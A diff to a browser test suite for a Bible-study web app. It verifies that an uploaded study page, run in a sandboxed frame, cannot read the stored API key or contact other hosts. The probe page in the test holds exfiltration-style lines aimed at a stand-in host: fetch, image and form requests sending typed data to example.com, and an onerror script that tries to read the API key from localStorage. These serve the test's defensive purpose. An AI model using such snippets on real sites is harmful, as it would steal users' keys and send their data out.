@@ -3,7 +3,9 @@
 // <img onerror> or script in library HTML cannot run, so it cannot read the API key; a fetch or
 // an image request to another host is refused before it leaves, while Claude's address is let
 // through. A study page still runs its own scripts, in its sandboxed frame, where storage is
-// refused. And study-frame.html, opened outside the sandbox, writes nothing.
+// refused, and under the frame's own policy it can reach no other host: not with a fetch, not
+// with an image, not with a form (the sandbox allows none). The app's line above the frame
+// says the page is not the app's. And study-frame.html, opened outside the sandbox, writes nothing.
 import fs from "node:fs";
 
 export default async function run(browser, { BASE, PASS, SHOTS }) {
@@ -14,7 +16,7 @@ export default async function run(browser, { BASE, PASS, SHOTS }) {
     try { localStorage.setItem("gospel.apiKey", JSON.stringify("sk-ant-test-not-a-key")); } catch (_) {}
     window.__csp = [];
     document.addEventListener("securitypolicyviolation", (e) => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
-    window.addEventListener("message", (e) => { if (e.data && e.data.type === "probe") window.__probe = e.data; });
+    window.addEventListener("message", (e) => { if (e.data && e.data.type === "probe") window.__probe = e.data; if (e.data && e.data.type === "probe-net") window.__net = e.data.out; });
   });
   // every request that leaves for another host is counted; Claude's address answers
   const left = [];
@@ -76,13 +78,23 @@ export default async function run(browser, { BASE, PASS, SHOTS }) {
   // a study page: its own script runs, its handler runs, and neither can see the app's storage
   const file = `${SHOTS}csp-probe.html`;
   fs.writeFileSync(file, `<!doctype html><html><head><title>Probe page</title></head><body><h1>Probe page</h1>
-<script>window.ran = "own script ran";</script>
+<script>window.ran = "own script ran";
+window.out = {};
+fetch("https://example.com/take", { method: "POST", body: "typed" }).then(function () { window.out.fetch = "sent"; }, function (e) { window.out.fetch = "refused"; });
+fetch("https://example.com/take?k=typed", { mode: "no-cors" }).then(function () { window.out.nocors = "sent"; }, function (e) { window.out.nocors = "refused"; });
+var im = new Image(); im.onload = function () { window.out.img = "loaded"; }; im.onerror = function () { window.out.img = "refused"; }; im.src = "https://example.com/p.gif?k=typed";
+var dot = new Image(); dot.onload = function () { window.out.data = "loaded"; }; dot.onerror = function () { window.out.data = "refused"; }; dot.src = "data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==";
+setTimeout(function () { parent.postMessage({ type: "probe-net", out: window.out }, "*"); }, 1200);
+</script>
+<form id="f" action="https://example.com/form" method="post"><input name="passphrase" value="typed"></form>
+<script>try { document.getElementById("f").submit(); } catch (e) {}</script>
 <img src="nothing-here.png" onerror="var v, p; try { v = 'READ ' + localStorage.getItem('gospel.apiKey'); } catch (e) { v = 'REFUSED ' + e.name; } try { p = 'READ ' + parent.localStorage.getItem('gospel.apiKey'); } catch (e) { p = 'REFUSED ' + e.name; } parent.postMessage({ type: 'probe', own: v, parents: p, ran: window.ran, origin: self.origin }, '*')">
 </body></html>`);
   await page.evaluate(() => { location.hash = ""; });
   await page.click("#homeBtn");
   await page.locator("#homeBody .shelf-tile:has-text('My studies')").click();
   await page.waitForSelector(".studies-add .primary");
+  left.length = 0;
   await page.setInputFiles("#homeBody input[type=file]", file);
   await page.waitForSelector("#reader .study-frame", { timeout: 20000 });
   await page.waitForFunction(() => !!window.__probe, null, { timeout: 8000 }).catch(() => {});
@@ -93,6 +105,16 @@ export default async function run(browser, { BASE, PASS, SHOTS }) {
     check(/^REFUSED/.test(probe.own) && /^REFUSED/.test(probe.parents) && probe.origin === "null", `the study page could see storage: ${JSON.stringify(probe)}`);
   }
   check((await page.frameLocator("#reader .study-frame").locator("h1").textContent().catch(() => "")) === "Probe page", "the study page did not show");
+  // the study page reaches no other host, and the app says whose page it is
+  await page.waitForFunction(() => !!window.__net, null, { timeout: 8000 }).catch(() => {});
+  const net = await page.evaluate(() => window.__net || null);
+  check(!!net && net.fetch === "refused" && net.nocors === "refused" && net.img === "refused", `a study page reached another host: ${JSON.stringify(net)}`);
+  check(!!net && net.data === "loaded", `a picture held in the study page itself should still show: ${JSON.stringify(net)}`);
+  check(left.length === 0, `requests left a study page for another host: ${left.join(", ")}`);
+  check((await page.frameLocator("#reader .study-frame").locator("h1").textContent().catch(() => "")) === "Probe page", "the study page's form took the frame somewhere");
+  check((await page.getAttribute("#reader .study-frame", "sandbox")) === "allow-scripts", "the study frame's sandbox allows more than scripts");
+  const strip = await page.evaluate(() => { const s = document.querySelector("#reader .study-own"), f = document.querySelector("#reader .study-frame"); return s ? { text: s.textContent, above: s.getBoundingClientRect().bottom <= f.getBoundingClientRect().top + 1, h: Math.round(s.getBoundingClientRect().height) } : null; });
+  check(!!strip && /^Your own page\. It is not part of the app; never type a passphrase or key into it\.$/.test(strip.text) && strip.above && strip.h <= 30, `the line above a study page: ${JSON.stringify(strip)}`);
   await page.screenshot({ path: `${SHOTS}csp-study.png` });
   await page.evaluate(async () => { for (const s of await Studies.list()) await Studies.remove(s.id); });
 
